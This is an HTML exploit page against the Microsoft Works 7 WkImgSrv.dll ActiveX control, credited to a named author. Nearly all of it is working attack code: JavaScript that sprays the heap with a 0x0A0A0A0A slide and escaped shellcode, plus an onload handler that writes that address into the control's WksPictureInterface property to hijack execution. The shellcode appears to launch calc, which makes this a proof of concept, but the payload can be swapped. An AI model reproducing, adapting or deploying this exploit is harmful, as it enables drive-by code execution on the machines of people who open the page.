&lt;html&gt;
&lt;head&gt;
&lt;title&gt;Microsoft Works 7 WkImgSrv.dll Exploit&lt;/title&gt;

Coded by lhoang8500
lhoang8500[at]gmail[dot]com
 BKIS Center - Vietnam

&lt;SCRIPT language=&quot;javascript&quot;&gt;

        var heapSprayToAddress = 0x0A0A0A0A;

        var payLoadCode =
unescape(&quot;%u9090%u9090%u9090%u9090%u9090%uE8FC%u0044%u0000%u458B%u8B3C%u057C%u0178%u8BEF%u184F%u5F8B%u0120%u49EB%u348B%u018B%u31EE%u99C0%u84AC%u74C0%uC107%u0DCA%uC201%uF4EB%u543B%u0424%uE575%u5F8B%u0124%u66EB%u0C8B%u8B4B%u1C5F%uEB01%u1C8B%u018B%u89EB%u245C%uC304%uC031%u8B64%u3040%uC085%u0C78%u408B%u8B0C%u1C70%u8BAD%u0868%u09EB%u808B%u00B0%u0000%u688B%u5F3C%uF631%u5660%uF889%uC083%u507B%u7E68%uE2D8%u6873%uFE98%u0E8A%uFF57%u63E7%u6C61%u0063&quot;);

        var heapBlockSize = 0x400000;

        var payLoadSize = payLoadCode.length * 2;

        var spraySlideSize = heapBlockSize - (payLoadSize+0x38);

        var spraySlide = unescape(&quot;%u0A0A%u0A0A&quot;);
        spraySlide = getSpraySlide(spraySlide,spraySlideSize);

        heapBlocks = (heapSprayToAddress - 0x400000)/heapBlockSize;

        memory = new Array();

        for (i=0;i&lt;heapBlocks;i++)
        {
                memory[i] = spraySlide + payLoadCode;
        }

        function getSpraySlide(spraySlide, spraySlideSize)
        {
                while (spraySlide.length*2&lt;spraySlideSize)
                {
                        spraySlide += spraySlide;
                }
                spraySlide = spraySlide.substring(0,spraySlideSize/2);
                return spraySlide;
        }

&lt;/script&gt;
  &lt;script language=&quot;JavaScript&quot;&gt;
    function payload() {
var num = 168430090;
obj.WksPictureInterface = num;
  }
   &lt;/script&gt;
&lt;/head&gt;
 &lt;body onload=&quot;JavaScript: return payload();&quot;&gt;
&lt;object classid=&quot;clsid:00E1DB59-6EFD-4CE7-8C0A-2DA3BCAAD9C6&quot; id=&quot;obj&quot;&gt;
&lt;/object&gt;
 &lt;/body&gt;
&lt;/html&gt; 
